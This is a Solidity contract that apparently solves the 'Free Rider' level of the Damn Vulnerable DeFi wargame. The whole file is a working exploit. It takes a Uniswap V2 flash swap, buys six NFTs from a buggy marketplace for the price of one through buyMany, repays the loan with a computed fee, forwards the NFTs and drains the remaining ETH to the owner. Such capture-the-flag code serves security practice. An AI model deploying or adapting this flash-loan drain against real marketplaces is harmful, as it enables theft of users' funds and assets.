// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "hardhat/console.sol";
import "./FreeRiderNFTMarketplace.sol";


interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IUniswapV2Pair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
}


contract FreeRiderAttack is Ownable, IUniswapV2Callee, IERC721Receiver{
    using SafeMath for uint;
    IWETH private _weth;
    IERC20 private _token;
    IUniswapV2Pair private _uniswapV2Pair;
    FreeRiderNFTMarketplace private _freeRiderNFTMarketplace;
    address private _buyerAddress;
    constructor(address wethAddress,
            address tokenAddress,
            address payable freeRiderNFTMarketplaceAddress,
            address uniswapV2PairAddress, address buyerAddress) Ownable() {
        _weth = IWETH(wethAddress);
        _token = IERC20(tokenAddress);
        _freeRiderNFTMarketplace = FreeRiderNFTMarketplace(freeRiderNFTMarketplaceAddress);
        _uniswapV2Pair = IUniswapV2Pair(uniswapV2PairAddress);
        _buyerAddress = buyerAddress;
    }

    function start() public payable onlyOwner {
        uint amount = 15 * 10 ** 18;
        (uint amount0Out, uint amount1Out) = address(_weth) < address(_token) ? (amount, uint(0)) : (uint(0), amount);
        _uniswapV2Pair.swap(amount0Out, amount1Out, address(this), abi.encode(amount));
        DamnValuableNFT nft = _freeRiderNFTMarketplace.token();
        uint i = 0;
        for(; i < 6; i++) {
            nft.safeTransferFrom(address(this), _buyerAddress, i, abi.encode("xixi"));
        }

        // drain all token
        _weth.withdraw(_weth.balanceOf(address(this)));
        payable(owner()).call{value: address(this).balance}("");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        uint amount = abi.decode(data, (uint));
        _weth.withdraw(_weth.balanceOf(address(this)));
        uint[] memory tokenIds = new uint[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        _freeRiderNFTMarketplace.buyMany{value: amount}(tokenIds);

        uint balance0 = _weth.balanceOf(address(_uniswapV2Pair));
        uint balance1 = _token.balanceOf(address(_uniswapV2Pair));
        console.log("balance0 is %s  balance1 is %s", _weth.balanceOf(address(_uniswapV2Pair)), _token.balanceOf(address(_uniswapV2Pair)));
        (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) = _uniswapV2Pair.getReserves();
        console.log("_reserve0 is %s, _reserve1 is %s", _reserve0, _reserve1);
        uint refundAmount = computeRefund(balance0, amount0, _reserve0);
        console.log("refundAmount is %s", refundAmount);
        _weth.deposit{value: refundAmount}();
        // pay back
        _weth.transfer(address(_uniswapV2Pair), refundAmount);

    }

    // for simplify, balance0 is out token
    function computeRefund(uint currentBalance0, uint amount0Out, uint _reserve0) private view returns(uint refundAmount) {
        // uint(_reserve0).mul(1000) / (bal * 1000 - (bal - (_reserve0 - amount0Out)) * 3)
        // uint(_reserve0).mul(1000) < (bal * 997 + 3 * _reserve0 - amount0Out * 3)
        // (bal * 997 + 3 * _reserve0 - amount0Out * 3) - uint(_reserve0).mul(1000) >= 0
        // bal * 997  >= uint(_reserve0).mul(1000) + amount0Out * 3 - 3 * _reserve0
        // (bal * 997 + 3 * _reserve0 - amount0Out * 3) - uint(_reserve0).mul(1000) >= 0

        return (uint(_reserve0).mul(1000) + amount0Out * 3 - 3 * _reserve0) / 997 - currentBalance0 + 1;
        // btw, for simply, can /996, can pass _uniswapV2Pair check
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    override
    returns (bytes4)
    {
        require(_tokenId >= 0 && _tokenId <= 5);

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
